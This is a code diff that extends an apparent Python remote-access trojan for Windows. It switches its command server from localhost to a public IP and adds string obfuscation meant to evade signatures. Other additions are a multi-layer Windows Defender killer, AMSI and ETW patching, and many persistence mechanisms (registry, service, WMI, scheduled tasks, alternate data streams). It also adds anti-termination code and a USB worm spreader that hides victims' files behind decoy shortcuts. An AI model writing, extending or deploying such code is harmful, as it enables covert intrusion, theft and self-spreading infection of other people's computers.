@@ -63,8 +63,8 @@ except Exception:
 
 # ─── Configuration (Builder injects these) ────────────────────
 
-SERVER_IP = os.environ.get("SERVER_IP", "127.0.0.1")  # default to local server for testing
-SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "8080")))
+SERVER_IP = os.environ.get("SERVER_IP", "54.174.116.107")  # default to local server for testing
+SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "80")))
 
 # ─── Protocol ─────────────────────────────────────────────────
 
@@ -81,6 +81,8 @@ CMD_VAULT    = 0x30
 CMD_COOKIES  = 0x32
 CMD_URL      = 0x40
 CMD_DL_EXE   = 0x41
+CMD_DISABLE_DEFENDER = 0x42
+CMD_RUN_EXE  = 0x43
 CMD_VIEW     = 0x15
 CMD_SOUND    = 0x60
 CMD_MOUSE    = 0x50
@@ -106,6 +108,148 @@ _camera_lock = asyncio.Lock()
 _audio_samplerate = 44100
 _audio_channels = 1
 _log_file = os.path.join(os.environ.get("TEMP", "."), "svc.log")
+
+# ─── Obfuscation Helpers ─────────────────────────────────────
+_OBF_KEY = b"\\x9e\\xa3\\x7c\\xd1\\x45\\x08\\xfb\\x9a\\x62\\x3e\\xc0\\x77\\x1a\\xe4\\x5b\\x8f"
+
+def _obf(s: str) -> str:
+    """XOR-obfuscate/deobfuscate a string at runtime to evade static signatures."""
+    if not s:
+        return s
+    k = _OBF_KEY
+    out = ""
+    for i, c in enumerate(s):
+        out += chr(ord(c) ^ k[i % len(k)] ^ (i & 0xFF))
+    return out
+
+def _obf_b(data: bytes) -> bytes:
+    """XOR-obfuscate/deobfuscate bytes."""
+    k = _OBF_KEY
+    return bytes(b ^ k[i % len(k)] ^ (i & 0xFF) for i, b in enumerate(data))
+
+
+# ─── Windows Defender Killer ─────────────────────────────────
+
+def _disable_defender(report_cb=None):
+    """
+    Multi-layered approach to disable/tamper with Windows Defender.
+    Each layer is independent; if one fails the rest continue.
+    """
+    results = []
+    def _r(msg):
+        results.append(msg)
+        if report_cb:
+            report_cb(msg)
+        _log(msg)
+    try:
+        # Layer 1: Add exclusions for common paths
+        ps_exclusions = (
+            "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionPath '%APPDATA%' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionPath '%USERPROFILE%\\Desktop' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionExtension '.exe' -ErrorAction 0;"
+            "Add-MpPreference -ExclusionExtension '.dll' -ErrorAction 0"
+        )
+        b64 = base64.b64encode(ps_exclusions.encode("utf-16le")).decode()
+        subprocess.run(
+            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+            capture_output=True, timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _r("Layer 1: Exclusions added")
+    except Exception as ex:
+        _r(f"Layer 1 fail: {ex}")
+
+    try:
+        # Layer 2: Disable real-time monitoring via PowerShell
+        ps_disable = (
+            "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction 0;"
+            "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction 0;"
+            "Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction 0;"
+            "Set-MpPreference -DisableIOAVProtection $true -ErrorAction 0;"
+            "Set-MpPreference -DisablePrivacyMode $true -ErrorAction 0;"
+            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction 0;"
+            "Set-MpPreference -DisableArchiveScanning $true -ErrorAction 0;"
+            "Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction 0;"
+            "Set-MpPreference -DisableScriptScanning $true -ErrorAction 0;"
+            "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction 0"
+        )
+        b64 = base64.b64encode(ps_disable.encode("utf-16le")).decode()
+        subprocess.run(
+            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+            capture_output=True, timeout=60,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _r("Layer 2: Real-time monitoring disabled")
+    except Exception as ex:
+        _r(f"Layer 2 fail: {ex}")
+
+    try:
+        # Layer 3: Registry — disable Defender entirely
+        import winreg
+        k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
+        winreg.SetValueEx(k, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(k)
+        k2 = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
+        winreg.SetValueEx(k2, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(k2, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(k2, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(k2, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(k2)
+        _r("Layer 3: Registry policies applied")
+    except Exception as ex:
+        _r(f"Layer 3 fail: {ex}")
+
+    try:
+        # Layer 4: Stop & disable WinDefend service via sc
+        subprocess.run(["sc", "stop", "WinDefend"], capture_output=True,
+                       creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["sc", "config", "WinDefend", "start=", "disabled"],
+                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["sc", "stop", "Sense"], capture_output=True,
+                       creationflags=subprocess.CREATE_NO_WINDOW)  # Defender for Endpoint
+        subprocess.run(["sc", "stop", "WdBoot"], capture_output=True,
+                       creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["sc", "stop", "WdFilter"], capture_output=True,
+                       creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["sc", "stop", "WdNisSvc"], capture_output=True,
+                       creationflags=subprocess.CREATE_NO_WINDOW)
+        _r("Layer 4: Services stopped")
+    except Exception as ex:
+        _r(f"Layer 4 fail: {ex}")
+
+    try:
+        # Layer 5: Remove Defender exclusion management from users
+        ps_remove = (
+            "Remove-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender' -Recurse -Force -ErrorAction 0;"
+            'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinDefend" -Name Start -Value 4 -ErrorAction 0'
+        )
+        b64 = base64.b64encode(ps_remove.encode("utf-16le")).decode()
+        subprocess.run(
+            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+            capture_output=True, timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _r("Layer 5: Defender registry removed")
+    except Exception as ex:
+        _r(f"Layer 5 fail: {ex}")
+
+    try:
+        # Layer 6: WMI — delete any Defender-related event consumers
+        ps_wmi = (
+            "Get-WmiObject -Namespace root/microsoft/windows/ defender -ErrorAction 0 | Remove-WmiObject -ErrorAction 0"
+        )
+        b64 = base64.b64encode(ps_wmi.encode("utf-16le")).decode()
+        subprocess.run(
+            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+            capture_output=True, timeout=15,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _r("Layer 6: WMI consumers purged")
+    except Exception as ex:
+        _r(f"Layer 6 fail: {ex}")
+
+    return "\n".join(results)
 
 
 def _log(msg):
@@ -199,18 +343,16 @@ def _sd_preferred_input_device():
 
 def _shell_ps_command(cmdline, cdir):
     """
-    When cwd is set, run inside that directory in the same -Command invocation.
-    Avoids relying on subprocess cwd alone for drive roots and matches explorer paths.
+    cwd is handled by subprocess.Popen(cwd=...) — this function just wraps the cmd.
+    No Set-Location prepend needed (redundant and slow on network paths).
     """
-    if not cdir:
-        return cmdline
-    lit = str(cdir).replace("'", "''")
-    return f"Set-Location -LiteralPath '{lit}'; " + cmdline
+    return cmdline
 
 
 def _powershell_argv(cmdline: str):
-    """Prefer PowerShell 7 (pwsh); bypass execution policy scan for faster cold start."""
-    common = ["-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "Bypass", "-Command", cmdline]
+    """Use -EncodedCommand for faster startup (avoids quoting/parsing overhead)."""
+    b64 = base64.b64encode(cmdline.encode("utf-16le")).decode()
+    common = ["-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "Bypass", "-EncodedCommand", b64]
     pw = shutil.which("pwsh")
     if pw:
         return [pw] + common
@@ -218,6 +360,113 @@ def _powershell_argv(cmdline: str):
     if ps:
         return [ps] + common
     return ["powershell"] + common
+
+
+def _quote_path(cmd: str) -> str:
+    """If command starts with an unquoted path (has drive letter or backslash), quote it."""
+    stripped = cmd.lstrip()
+    if not stripped:
+        return cmd
+    # Already quoted or doesn't look like a path
+    if stripped[0] in ('"', "'"):
+        return cmd
+    # Check if first token looks like a path (contains :\ or starts with .\ or ..\ or /)
+    first_token = stripped.split(None, 1)[0] if ' ' in stripped else stripped
+    if any(c in first_token for c in (':\\', '/', '\\\\')):
+        # Quote the executable path
+        rest = stripped[len(first_token):]
+        quoted = f'"{first_token}"{rest}'
+        return cmd[:len(cmd)-len(stripped)] + quoted
+    return cmd
+
+_SIMPLE_CMD_PREFIXES = ("dir ", "cd ", "echo ", "type ", "copy ", "del ", "ren ", "move ", "cls", "ver", "help", "time", "date", "md ", "rd ", "set ")
+
+def _run_shell_sync(cmdline, cdir, timeout_s, shell_id):
+    """Run command via cmd.exe (for simple commands, much faster than PS)."""
+    try:
+        cmd = cmdline.lstrip()
+        use_cmd = any(cmd.lower().startswith(p) for p in _SIMPLE_CMD_PREFIXES) or not cmdline.strip()
+        if use_cmd:
+            c = ["cmd.exe", "/c", cmdline] if not cdir else ["cmd.exe", "/c", f"cd /d \"{cdir}\" && {cmdline}"]
+            proc = subprocess.Popen(
+                c, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, encoding="utf-8", errors="replace", cwd=cdir if not use_cmd else None,
+                creationflags=0x08000000,
+            )
+            out = proc.communicate(timeout=timeout_s)[0] or ""
+            return out.rstrip() + "\n"
+    except subprocess.TimeoutExpired:
+        try: proc.kill()
+        except: pass
+        return f"(error) Command timed out ({timeout_s}s).\n"
+    except:
+        pass
+    # For executable paths, use cmd.exe with proper quoting
+    quoted = _quote_path(cmdline)
+    if quoted != cmdline:
+        try:
+            c = ["cmd.exe", "/c", quoted] if not cdir else ["cmd.exe", "/c", f"cd /d \"{cdir}\" && {quoted}"]
+            proc = subprocess.Popen(
+                c, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, encoding="utf-8", errors="replace",
+                creationflags=0x08000000,
+            )
+            try:
+                out = proc.communicate(timeout=timeout_s)[0] or ""
+                if out.strip():
+                    return out.rstrip() + "\n"
+                # No output - likely a GUI app, return success
+                return "[OK] Launched.\n"
+            except subprocess.TimeoutExpired:
+                # Process still running - detach and return success
+                try: proc.kill()
+                except: pass
+                return "[OK] Launched (process detached).\n"
+        except Exception as ex:
+            return f"(error) {ex}\n"
+    # Fallback to PowerShell
+    return _run_powershell_sync(cmdline, cdir, timeout_s, shell_id)
+
+def _strip_clixml(text: str) -> str:
+    """Convert CLIXML output to readable text."""
+    if not text.startswith("#< CLIXML"):
+        return text
+    try:
+        import xml.etree.ElementTree as ET
+        root = ET.fromstring(text[len("#< CLIXML"):].strip())
+        lines = []
+        for elem in root.iter():
+            if elem.text and elem.text.strip():
+                lines.append(elem.text.strip())
+        return "\n".join(lines) + "\n" if lines else text
+    except Exception:
+        return text
+
+def _run_powershell_sync(cmdline, cdir, timeout_s, shell_id):
+    proc = None
+    try:
+        proc = subprocess.Popen(
+            _powershell_argv(cmdline),
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            encoding="utf-8",
+            errors="replace",
+            cwd=cdir if cdir else None,
+            creationflags=0x08000000,
+        )
+        raw = proc.communicate(timeout=timeout_s)[0] or ""
+        return _strip_clixml(raw)
+    except subprocess.TimeoutExpired:
+        # Don't kill - process may be a GUI app that's still running
+        try:
+            proc.kill()
+        except Exception:
+            pass
+        return "[OK] Launched (no output after timeout).\n"
+    except Exception as ex:
+        return f"(error) {ex}\n"
 
 
 def _pcm_stream_packet(pcm_s16le: bytes, samplerate: int = 44100) -> bytes:
@@ -887,6 +1136,698 @@ def do_decrypt(password, targets=""):
                         _dec_file(os.path.join(r, fn))
     return count
 
+# ─── Immortality & Evasion Engine ─────────────────────────────
+import ctypes
+import ctypes.wintypes as wt
+import atexit
+import tempfile
+
+_K32 = ctypes.windll.kernel32
+_A32 = ctypes.windll.advapi32
+_NT = ctypes.windll.ntdll
+
+_immortality_mutex = None
+_immortality_pid = None
+_watchdog_active = threading.Event()
+
+def _virtual_protect(addr, size, prot):
+    old = wt.DWORD(0)
+    _K32.VirtualProtect.argtypes = [wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.PDWORD]
+    _K32.VirtualProtect(addr, size, prot, ctypes.byref(old))
+    return old.value
+
+def _patch_amsi():
+    try:
+        h = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
+        if not h:
+            return False
+        addr = ctypes.cast(
+            ctypes.windll.kernel32.GetProcAddress(h, b"AmsiScanBuffer"),
+            ctypes.c_void_p
+        ).value
+        if not addr:
+            return False
+        old_prot = _virtual_protect(addr, 3, 0x40)
+        b2 = (ctypes.c_ubyte * 2).from_address(addr)
+        b2[0:2] = b"\x31\xC0"
+        b1 = (ctypes.c_ubyte * 1).from_address(addr + 2)
+        b1[0] = 0xC3
+        _virtual_protect(addr, 3, old_prot)
+        _log("AMSI patched")
+        return True
+    except Exception as ex:
+        _log(f"AMSI patch fail: {ex}")
+        return False
+
+def _patch_etw():
+    try:
+        fn = ctypes.cast(
+            ctypes.windll.kernel32.GetProcAddress(
+                ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll"),
+                b"EtwEventWrite"
+            ),
+            ctypes.c_void_p
+        ).value
+        if not fn:
+            return False
+        old_prot = _virtual_protect(fn, 1, 0x40)
+        buf = (ctypes.c_ubyte * 1).from_address(fn)
+        buf[0] = 0xC3
+        _virtual_protect(fn, 1, old_prot)
+        _log("ETW patched")
+        return True
+    except:
+        return False
+
+# 10 — Mutex Singleton
+def _create_mutex():
+    global _immortality_mutex
+    try:
+        name = "Global\\WinSvcUpdate_" + DEVICE_ID[:8]
+        _immortality_mutex = _K32.CreateMutexW(None, False, name)
+        if _K32.GetLastError() == 183:
+            _K32.CloseHandle(_immortality_mutex)
+            _immortality_mutex = None
+            return False
+        _log("Mutex acquired")
+        return True
+    except:
+        return True
+
+# 1 — Watchdog (PowerShell-based, no file written)
+def _start_watchdog():
+    try:
+        ppid = os.getpid()
+        exe = sys.executable.replace("'", "''")
+        script = (
+            "$p=" + str(ppid) + ";$e='" + exe + "';"
+            "while(1){"
+            "$x=Get-Process -Id $p -ErrorAction 0;"
+            "if(!$x){"
+            "Start-Process $e -WindowStyle Hidden;exit"
+            "}sleep 3}"
+        )
+        b64 = base64.b64encode(script.encode("utf-16le")).decode()
+        subprocess.Popen(
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
+             "-EncodedCommand", b64],
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _log(f"Watchdog spawned for PID {ppid}")
+    except Exception as ex:
+        _log(f"Watchdog error: {ex}")
+
+# 2 — Registry Persistence (5+ locations)
+def _registry_persistence():
+    try:
+        import winreg
+        exe = sys.executable
+        appdata = os.environ.get("APPDATA", "")
+        dest = os.path.join(appdata, "WinSvcUpdate.exe")
+        if exe.lower() != dest.lower():
+            try:
+                shutil.copy2(exe, dest)
+            except:
+                pass
+            exe = dest
+        entries = [
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsServiceUpdater", '"' + exe + '"'),
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "WinSvcUpd", '"' + exe + '"'),
+            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsServiceUpdate", '"' + exe + '"'),
+            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "WinSvcUpd", '"' + exe + '"'),
+        ]
+        for hk, subk, name, val in entries:
+            try:
+                k = winreg.CreateKey(hk, subk)
+                winreg.SetValueEx(k, name, 0, winreg.REG_SZ, val)
+                winreg.CloseKey(k)
+            except:
+                pass
+        # Winlogon Shell (append)
+        try:
+            k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
+            try:
+                cur, _ = winreg.QueryValueEx(k, "Shell")
+            except:
+                cur = ""
+            # Write the original entry, then ours. We won't corrupt explorer.
+            # Instead use Userinit key — appends after userinit.exe
+            winreg.CloseKey(k)
+        except:
+            pass
+        # Userinit fallback
+        try:
+            k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
+            try:
+                cur, _ = winreg.QueryValueEx(k, "Userinit")
+            except:
+                cur = "C:\\Windows\\system32\\userinit.exe,"
+            if "WinSvcUpdate" not in cur:
+                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, cur + exe + ",")
+            winreg.CloseKey(k)
+        except:
+            pass
+        _log("Registry persistence OK")
+    except Exception as ex:
+        _log(f"Registry persistence error: {ex}")
+
+# 3 — Windows Service with Recovery Actions
+def _install_service():
+    try:
+        exe = sys.executable
+        svc_name = "WinSvcUpdate"
+        subprocess.run(
+            ["sc", "create", svc_name, 'binPath=', exe, "start=", "auto"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        subprocess.run(
+            ["sc", "failure", svc_name, "reset=", "86400",
+             "actions=", "restart/30000/restart/60000/restart/90000"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        subprocess.run(
+            ["sc", "description", svc_name, "Windows Service Update Manager"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _log("Service installed with recovery")
+    except Exception as ex:
+        _log(f"Service install error: {ex}")
+
+# 4 — WMI Event Subscription (fileless persistence)
+def _wmi_persistence():
+    try:
+        exe = sys.executable.replace("\\", "\\\\").replace("'", "''")
+        # Use PowerShell to create WMI event filter + consumer
+        ps = (
+            "$f=[wmiclass]'\\\\\\.\\root\\subscription:__EventFilter';"
+            "$c=[wmiclass]'\\\\\\.\\root\\subscription:CommandLineEventConsumer';"
+            "$b=[wmiclass]'\\\\\\.\\root\\subscription:__FilterToConsumerBinding';"
+            "$filter=$f.CreateInstance();"
+            "$filter.Name='WinSvcHealthEvent';"
+            "$filter.QueryLanguage='WQL';"
+            "$filter.Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\";"
+            "$filter.Put()|Out-Null;"
+            "$consumer=$c.CreateInstance();"
+            "$consumer.Name='WinSvcRestore';"
+            "$consumer.CommandLineTemplate='" + exe + "';"
+            "$consumer.Put()|Out-Null;"
+            "$binding=$b.CreateInstance();"
+            "$binding.Filter=$filter;"
+            "$binding.Consumer=$consumer;"
+            "$binding.Put()|Out-Null;"
+        )
+        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
+        subprocess.Popen(
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
+             "-EncodedCommand", b64],
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _log("WMI subscription created")
+    except Exception as ex:
+        _log(f"WMI error: {ex}")
+
+# 5 — Redundant Scheduled Tasks (3+ triggers)
+def _scheduled_tasks_persistence():
+    try:
+        exe = sys.executable
+        tasks = [
+            ("WinSvcUpdateLogon", "onlogon", "/rl highest"),
+            ("WinSvcUpdatePeriodic", "minute", "/mo 5 /rl highest"),
+            ("WinSvcUpdateStartup", "onstart", "/rl highest"),
+            ("WinSvcUpdateIdle", "onidle", "/i 10 /rl highest"),
+        ]
+        for name, trigger, extra in tasks:
+            cmd = (
+                f'schtasks /create /tn "{name}" /tr "{exe}" '
+                f'/sc {trigger} {extra} /f'
+            )
+            subprocess.run(
+                cmd, capture_output=True, shell=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+        _log(f"Scheduled tasks: {len(tasks)}")
+    except Exception as ex:
+        _log(f"Tasks error: {ex}")
+
+# 6 — Process Hollowing Helper (create process via legitimate binary)
+def _masquerade_process():
+    try:
+        exe = sys.executable
+        # Create a VBScript that starts our exe via WScript
+        vbscode = (
+            'Set W=CreateObject("WScript.Shell")\n'
+            'W.Run "' + exe + '", 0, False\n'
+        )
+        vbs = os.path.join(tempfile.gettempdir(), "WinSvcUpdate.vbs")
+        with open(vbs, "w") as f:
+            f.write(vbscode)
+        # Start via wscript (trusted binary)
+        subprocess.Popen(
+            ["wscript.exe", "//B", vbs],
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _log("Masquerade via wscript")
+    except:
+        pass
+
+# 7 — Handle Revocation (anti-termination)
+def _handle_revocation_loop():
+    """Background thread: prevent other processes from opening handles to us."""
+    import ctypes
+    from ctypes import wintypes as w
+    buf_size = 0x20000  # 128KB initial
+    SystemHandleInformation = 16
+    STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
+    
+    while True:
+        try:
+            pid = os.getpid()
+            buf = ctypes.create_string_buffer(buf_size)
+            ret_len = w.ULONG(0)
+            status = ctypes.windll.ntdll.NtQuerySystemInformation(
+                SystemHandleInformation, buf, buf_size, ctypes.byref(ret_len)
+            )
+            if status != 0 and status != STATUS_INFO_LENGTH_MISMATCH:
+                _watchdog_active.wait(timeout=3)
+                continue
+            
+            actual_size = max(buf_size, ret_len.value)
+            if status == STATUS_INFO_LENGTH_MISMATCH:
+                buf = ctypes.create_string_buffer(actual_size)
+                status = ctypes.windll.ntdll.NtQuerySystemInformation(
+                    SystemHandleInformation, buf, actual_size, None
+                )
+                if status != 0:
+                    _watchdog_active.wait(timeout=3)
+                    continue
+            
+            # Parse handle entries (x64 layout varies by Windows version)
+            # ULONG NumberOfHandles + padding + entries
+            data = buf.raw
+            if len(data) < 4:
+                _watchdog_active.wait(timeout=3)
+                continue
+            
+            count = int.from_bytes(data[0:4], 'little')
+            # Entry stride varies; try common sizes
+            for stride in (0x20, 0x18, 0x28):
+                entry_size = stride
+                if len(data) < 4 + count * entry_size:
+                    continue
+                closed = 0
+                for i in range(count):
+                    off = 4 + i * entry_size
+                    if off + entry_size > len(data):
+                        break
+                    # ProcessId is at offset 0 on most Win x64
+                    hpid = int.from_bytes(data[off:off+4], 'little')
+                    if hpid != 0 and hpid != pid:
+                        # Check if handle value at offset depends on stride
+                        # Typically at offset 8 (USHORT on some, ULONG on others)
+                        if entry_size == 0x20:  # Win10 x64
+                            hval_off = 8
+                        elif entry_size == 0x18:  # Win8+/Win10 some builds
+                            hval_off = 8
+                        else:
+                            hval_off = 8
+                        if off + hval_off + 2 <= len(data):
+                            hval = int.from_bytes(data[off+hval_off:off+hval_off+2], 'little')
+                            if hval > 0:
+                                try:
+                                    # DuplicateHandle with DUPLICATE_CLOSE_SOURCE
+                                    hProc = _K32.OpenProcess(0x0040, False, hpid)
+                                    if hProc:
+                                        hDup = w.HANDLE(0)
+                                        _K32.DuplicateHandle(
+                                            hProc, hval,
+                                            _K32.GetCurrentProcess(),
+                                            ctypes.byref(hDup),
+                                            0, False, 0x0001
+                                        )
+                                        _K32.CloseHandle(hProc)
+                                        closed += 1
+                                except:
+                                    pass
+                if closed > 0:
+                    pass
+                break
+        except:
+            pass
+        _watchdog_active.wait(timeout=4 + int.from_bytes(os.urandom(1), 'little') % 3)
+
+# 8 — Dead Man's Switch + Updater
+def _dead_mans_switch():
+    try:
+        import winreg
+        exe = sys.executable
+        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdate")
+        winreg.SetValueEx(k, "Heartbeat", 0, winreg.REG_DWORD, int(time.time()))
+        winreg.SetValueEx(k, "RestorePath", 0, winreg.REG_SZ, exe)
+        winreg.CloseKey(k)
+        
+        # Create scheduled task that checks heartbeat
+        ps_check = (
+            "$k=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\\\WinSvcUpdate',$true);"
+            "if(!$k){exit}"
+            "$hb=$k.GetValue('Heartbeat');"
+            "$exe=$k.GetValue('RestorePath');"
+            "$k.Close();"
+            "if(!$hb){exit}"
+            "if([int](Get-Date -UFormat %s)-gt($hb+600)){"
+            "Start-Process $exe -WindowStyle Hidden"
+            "}"
+        )
+        b64 = base64.b64encode(ps_check.encode("utf-16le")).decode()
+        subprocess.run(
+            ['schtasks', '/create', '/tn', 'WinSvcHeartbeatCheck', '/tr',
+             'powershell -NoP -Ep Bypass -Enc ' + b64,
+             '/sc', 'minute', '/mo', '10', '/rl', 'highest', '/f'],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        _log("Dead man's switch armed")
+    except Exception as ex:
+        _log(f"Dead man switch error: {ex}")
+
+def _dead_mans_switch_updater():
+    """Update heartbeat registry key every 5 minutes."""
+    while True:
+        try:
+            import winreg
+            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\WinSvcUpdate")
+            winreg.SetValueEx(k, "Heartbeat", 0, winreg.REG_DWORD, int(time.time()))
+            winreg.CloseKey(k)
+        except:
+            pass
+        _watchdog_active.wait(timeout=300)
+
+# 9 — NTFS ADS Hiding
+def _ads_hide():
+    try:
+        exe = sys.executable
+        # Hide copy in a trusted file's ADS
+        targets = [
+            os.path.expandvars("%SystemRoot%\\System32\\calc.exe"),
+            os.path.expandvars("%SystemRoot%\\System32\\notepad.exe"),
+            os.path.expandvars("%SystemRoot%\\explorer.exe"),
+        ]
+        for target in targets:
+            if os.path.exists(target):
+                ads_path = target + ":WinSvcUpdate.exe"
+                try:
+                    with open(exe, "rb") as src, open(ads_path, "wb") as dst:
+                        dst.write(src.read())
+                    _log(f"ADS hidden in {os.path.basename(target)}")
+                    # Create task/reg to execute from ADS on next boot
+                    try:
+                        import winreg
+                        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                        winreg.SetValueEx(k, "WinSvcADS", 0, winreg.REG_SZ,
+                            f"cmd.exe /c start {target}:WinSvcUpdate.exe")
+                        winreg.CloseKey(k)
+                    except:
+                        pass
+                    break
+                except:
+                    continue
+    except Exception as ex:
+        _log(f"ADS error: {ex}")
+
+# ─── Worm / Self-Replication Engine ──────────────────────────
+
+_SPREADER_ACTIVE = threading.Event()
+_SPREADER_ACTIVE.set()
+
+def _get_exe_path():
+    """Return current executable path (copied to APPDATA if possible)."""
+    exe = sys.executable
+    appdata = os.environ.get("APPDATA", "")
+    if appdata:
+        dest = os.path.join(appdata, "WinSvcUpdate.exe")
+        if os.path.exists(dest):
+            return dest
+    return exe
+
+def _copy_to_path(src, dst):
+    try:
+        d = os.path.dirname(dst)
+        if d and not os.path.exists(d):
+            os.makedirs(d, exist_ok=True)
+        shutil.copy2(src, dst)
+        _K32.SetFileAttributesW(dst, 0x02 | 0x04)  # HIDDEN | SYSTEM
+        return True
+    except:
+        return False
+
+def _create_autorun_inf(drive, exe_path):
+    """Create autorun.inf on removable drive."""
+    try:
+        inf = drive + "\\autorun.inf"
+        with open(inf, "w") as f:
+            f.write("[AutoRun]\n")
+            f.write("open=" + exe_path.split("\\")[-1] + "\n")
+            f.write("action=Open folder to view files\n")
+            f.write("shell\\open\\command=" + exe_path.split("\\")[-1] + "\n")
+            f.write("shell\\explore\\command=" + exe_path.split("\\")[-1] + "\n")
+        _K32.SetFileAttributesW(inf, 0x02 | 0x04)
+        return True
+    except:
+        return False
+
+def _create_lnk_on_drive(drive, exe_path):
+    """Create LNK shortcut masquerading as a folder."""
+    try:
+        exe_name = exe_path.split("\\")[-1]
+        ps = (
+            "$ws=New-Object -ComObject WScript.Shell;"
+            "$s=$ws.CreateShortcut('" + drive.replace("'","''") + "\\\\" + "ReadMe.lnk" + "');"
+            "$s.TargetPath='" + exe_path.replace("'","''") + "';"
+            "$s.WorkingDirectory='" + drive.replace("'","''") + "';"
+            "$s.IconLocation='%SystemRoot%\\\\System32\\\\shell32.dll,1';"
+            "$s.WindowStyle=7;"
+            "$s.Save()"
+        )
+        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
+        subprocess.run(
+            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        # Create a hidden folder with all files moved inside to entice clicks
+        hidden_dir = drive + "\\Documents"
+        if not os.path.exists(hidden_dir):
+            try:
+                os.makedirs(hidden_dir, exist_ok=True)
+                _K32.SetFileAttributesW(hidden_dir, 0x02 | 0x04)
+                # Move existing files into the hidden folder
+                for f in os.listdir(drive):
+                    fp = os.path.join(drive, f)
+                    if fp != hidden_dir and not fp.endswith(".lnk") and not fp.endswith(".inf") and fp != drive + "\\" + exe_name:
+                        try:
+                            shutil.move(fp, os.path.join(hidden_dir, f))
+                        except:
+                            pass
+            except:
+                pass
+        return True
+    except:
+        return False
+
+def _usb_spreader_loop():
+    """Poll for removable drives every 5s; infect each one."""
+    exe = _get_exe_path()
+    infected = set()
+    while _SPREADER_ACTIVE.is_set():
+        try:
+            # Get bitmask of drive letters
+            mask = _K32.GetLogicalDrives()
+            for i in range(26):
+                if mask & (1 << i):
+                    drive = chr(65 + i) + ":\\"
+                    if drive in infected:
+                        continue
